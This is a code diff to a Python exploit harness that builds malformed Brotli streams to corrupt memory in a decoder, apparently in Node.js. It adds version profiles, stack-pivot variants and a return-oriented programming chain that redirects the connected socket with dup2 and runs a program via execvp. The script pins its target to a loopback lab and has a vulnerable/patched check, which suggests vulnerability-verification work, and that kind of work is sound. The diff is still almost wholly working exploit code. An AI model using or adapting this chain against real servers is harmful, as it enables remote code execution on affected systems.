@@ -23,7 +23,7 @@ import time
 
 LOOPBACK_HOST = "127.0.0.1"
 LAB_PORT = 3000
-PROFILE_PATH = Path(__file__).with_name("profile-v24.22.0.json")
+PROFILE_DIR = Path(__file__).with_name("profiles")
 TRIGGER_SHA256 = "b7a6508eb39ef57ae5e3fdf9aa85540071a06eff5d5b5a2d359fc8e1768e4df4"
 TOKEN_PATTERN = re.compile(rb"PONG ([0-9a-f]{32})\n")
 ID_PATTERN = re.compile(
@@ -83,18 +83,28 @@ def _var_u8(out: LsbFields, value: int) -> None:
     out.append(value - (1 << width), width)
 
 
-def malformed_brotli(prefix: bytes, block_extra: int = 0xFFFFFF) -> bytes:
+def malformed_brotli(
+    prefix: bytes,
+    block_extra: int = 0xFFFFFF,
+    distance_code_adjustment: int = 0,
+    distance_symbol: int = 184,
+    window_bits: int = 10,
+) -> bytes:
     """Construct the two-metablock stream used by the affected decoder path."""
 
     if len(prefix) > 0x10000:
         raise ValueError("controlled prefix is too large")
     if not 0 <= block_extra <= 0xFFFFFF:
         raise ValueError("block length field is outside 24-bit range")
+    if not 0 <= distance_symbol < 400:
+        raise ValueError("distance symbol falls outside the configured alphabet")
+    if not 10 <= window_bits <= 15:
+        raise ValueError("the constrained generator supports window bits 10 through 15")
 
     out = LsbFields()
     out.append(1, 1)
     out.append(0, 3)
-    out.append(2, 3)
+    out.append(window_bits - 8, 3)
 
     if prefix:
         out.append(0, 1)
@@ -121,9 +131,11 @@ def malformed_brotli(prefix: bytes, block_extra: int = 0xFFFFFF) -> bytes:
     _simple_tree(out, 256, 0)
     _simple_tree(out, 704, 130)
     _simple_tree(out, 704, 130)
-    _simple_tree(out, 400, 184)
+    _simple_tree(out, 400, distance_symbol)
 
-    distance_code = (len(prefix) + 32) // 8 if prefix else 4
+    distance_code = ((len(prefix) + 32) // 8 if prefix else 4) + distance_code_adjustment
+    if not 0 <= distance_code < (1 << 11):
+        raise ValueError("distance code falls outside its 11-bit field")
     commands = 1 << 24
     while out._width and commands:
         out.append(distance_code, 11)
@@ -150,8 +162,11 @@ class Profile:
     raw: dict[str, object]
 
     @classmethod
-    def load(cls) -> "Profile":
-        raw = json.loads(PROFILE_PATH.read_text(encoding="utf-8"))
+    def load(cls, version: str = "24.22.0") -> "Profile":
+        if re.fullmatch(r"\d+\.\d+\.\d+", version) is None:
+            raise RuntimeError("profile version must have the form major.minor.patch")
+        path = PROFILE_DIR / f"{version}.json"
+        raw = json.loads(path.read_text(encoding="utf-8"))
         if raw.get("target") != "127.0.0.1:3000":
             raise RuntimeError("profile target must remain the bundled loopback lab")
         return cls(raw)
@@ -163,35 +178,149 @@ class Profile:
 def build_stage_one(profile: Profile) -> bytes:
     controlled = bytearray(profile.n("prefix_size"))
     source = profile.n("copy_source_offset")
+    chain_version = int(profile.raw.get("chain_version", 1))
+    if chain_version >= 3:
+        ring_base = profile.n("ring_base")
+        bootstrap_offset = profile.n("bootstrap_prefix_offset")
+        rax_base_offset = profile.n("rax_base_prefix_offset")
+        rop_offset = profile.n("decoder_compat_chain_offset")
+        proof_offset = profile.n("decoder_compat_proof_offset")
+        pivot_mode = str(profile.raw.get("pivot_mode", "saved_rip_pop_rsp"))
+        if pivot_mode == "saved_rbp_leave":
+            pivot_pair = struct.pack(
+                "<QQ",
+                ring_base + bootstrap_offset,
+                profile.n("leave_ret"),
+            )
+            bootstrap = (
+                0,
+                profile.n("pop_rax_ret"),
+                ring_base + rax_base_offset,
+            )
+        elif pivot_mode == "saved_rip_pop_rsp":
+            pivot_pair = struct.pack(
+                "<QQ",
+                profile.n("pop_rsp_ret"),
+                ring_base + bootstrap_offset,
+            )
+            bootstrap = (
+                profile.n("pop_rax_ret"),
+                ring_base + rax_base_offset,
+            )
+        else:
+            raise RuntimeError(f"unsupported pivot mode: {pivot_mode}")
+        controlled_end = min(source + len(pivot_pair), len(controlled))
+        if source < 0 or controlled_end <= source:
+            raise RuntimeError("pivot pair falls outside the controlled prefix")
+        uncontrolled_tail = pivot_pair[controlled_end - source :]
+        if any(uncontrolled_tail):
+            raise RuntimeError("non-zero pivot bytes fall outside the controlled prefix")
+        controlled[source:controlled_end] = pivot_pair[: controlled_end - source]
+        struct.pack_into(
+            "<" + "Q" * len(bootstrap),
+            controlled,
+            bootstrap_offset,
+            *bootstrap,
+        )
+
+        # Reuse the proven v2 bytes and execution chain exactly. The bootstrap
+        # above supplies the ring-derived RAX value that Node 26 clears before
+        # returning from the vulnerable decoder function.
+        base_padding = (0,) * int(profile.raw.get("execvp_base_padding", 0))
+        rop = (
+            profile.n("add_rax_path_offset_ret"),
+            profile.n("pop_rsi_ret"),
+            profile.n("bss_base") + 8,
+            profile.n("store_rax_at_rsi_ret"),
+            profile.n("pop_execvp_base_ret"),
+            profile.n("bss_base"),
+            *base_padding,
+            profile.n("pop_rdi_ret"),
+            profile.n("accepted_socket_fd"),
+            profile.n("pop_rsi_ret"),
+            1,
+            profile.n("dup2_plt"),
+            profile.n("execvp_call_site"),
+        )
+        if rop_offset + 8 * len(rop) > len(controlled):
+            raise RuntimeError("ROP chain falls outside the controlled prefix")
+        struct.pack_into("<" + "Q" * len(rop), controlled, rop_offset, *rop)
+        proof_program = b"/n2s\0"
+        if proof_offset + len(proof_program) > len(controlled):
+            raise RuntimeError("fixed proof program falls outside the controlled prefix")
+        controlled[proof_offset : proof_offset + len(proof_program)] = proof_program
+        return malformed_brotli(
+            bytes(controlled),
+            profile.n("command_block_extra"),
+            int(profile.raw.get("distance_code_adjustment", 0)),
+            int(profile.raw.get("distance_symbol", 184)),
+            int(profile.raw.get("window_bits", 10)),
+        ) + b"\0" * 3
+
+    source_move = (
+        profile.n("mov_rax_source_ret")
+        if chain_version >= 2
+        else profile.n("mov_rax_rdi_ret")
+    )
     struct.pack_into(
         "<QQ",
         controlled,
         source,
-        profile.n("mov_rax_rdi_ret"),
+        source_move,
         profile.n("pivot_rsp_rax_30_ret"),
     )
 
     bss = profile.n("bss_base")
-    rop = (
-        profile.n("pop_rsi_ret"),
-        bss + 8,
-        profile.n("store_rdi_plus_88_ret"),
-        profile.n("pop_rbx_ret"),
-        bss,
-        profile.n("pop_rdi_ret"),
-        profile.n("accepted_socket_fd"),
-        profile.n("pop_rsi_ret"),
-        1,
-        profile.n("dup2_plt"),
-        profile.n("execvp_call_site"),
-    )
-    struct.pack_into("<" + "Q" * len(rop), controlled, source + 0x30, *rop)
+    if chain_version >= 2:
+        source_adjustment = profile.n("source_to_rax_adjustment") if "source_to_rax_adjustment" in profile.raw else 0
+        base_padding = (0,) * int(profile.raw.get("execvp_base_padding", 0))
+        rop = (
+            profile.n("add_rax_path_offset_ret"),
+            profile.n("pop_rsi_ret"),
+            bss + 8,
+            profile.n("store_rax_at_rsi_ret"),
+            profile.n("pop_execvp_base_ret"),
+            bss,
+            *base_padding,
+            profile.n("pop_rdi_ret"),
+            profile.n("accepted_socket_fd"),
+            profile.n("pop_rsi_ret"),
+            1,
+            profile.n("dup2_plt"),
+            profile.n("execvp_call_site"),
+        )
+        rop_offset = source + source_adjustment + 0x30
+        proof_offset = source + source_adjustment + profile.n("proof_path_offset")
+    else:
+        rop = (
+            profile.n("pop_rsi_ret"),
+            bss + 8,
+            profile.n("store_rdi_plus_88_ret"),
+            profile.n("pop_rbx_ret"),
+            bss,
+            profile.n("pop_rdi_ret"),
+            profile.n("accepted_socket_fd"),
+            profile.n("pop_rsi_ret"),
+            1,
+            profile.n("dup2_plt"),
+            profile.n("execvp_call_site"),
+        )
+        rop_offset = source + 0x30
+        proof_offset = source + 0x88
+    if rop_offset < 0 or rop_offset + 8 * len(rop) > len(controlled):
+        raise RuntimeError("ROP chain falls outside the controlled prefix")
+    struct.pack_into("<" + "Q" * len(rop), controlled, rop_offset, *rop)
 
     proof_program = b"/n2s\0"
-    proof_offset = source + 0x88
+    if proof_offset + len(proof_program) > len(controlled):
+        raise RuntimeError("fixed proof program falls outside the controlled prefix")
     controlled[proof_offset : proof_offset + len(proof_program)] = proof_program
     return malformed_brotli(
-        bytes(controlled), profile.n("command_block_extra")
+        bytes(controlled),
+        profile.n("command_block_extra"),
+        int(profile.raw.get("distance_code_adjustment", 0)),
+        int(profile.raw.get("distance_symbol", 184)),
+        int(profile.raw.get("window_bits", 10)),
     ) + b"\0" * 3
 
 
@@ -399,6 +528,11 @@ def main() -> int:
     parser.add_argument("--timeout", type=float, default=30.0)
     parser.add_argument("--json-output", type=Path)
     parser.add_argument(
+        "--version",
+        default="24.22.0",
+        help="select an allowlisted bundled profile by exact Node.js version",
+    )
+    parser.add_argument(
         "--expect",
         choices=("vulnerable", "patched"),
         default="vulnerable",
@@ -410,7 +544,7 @@ def main() -> int:
     if not 1.0 <= args.timeout <= 60.0:
         parser.error("--timeout must be between 1 and 60 seconds")
 
-    profile = Profile.load()
+    profile = Profile.load(args.version)
     result = (
         run(profile, args.attempts, args.timeout)
         if args.expect == "vulnerable"
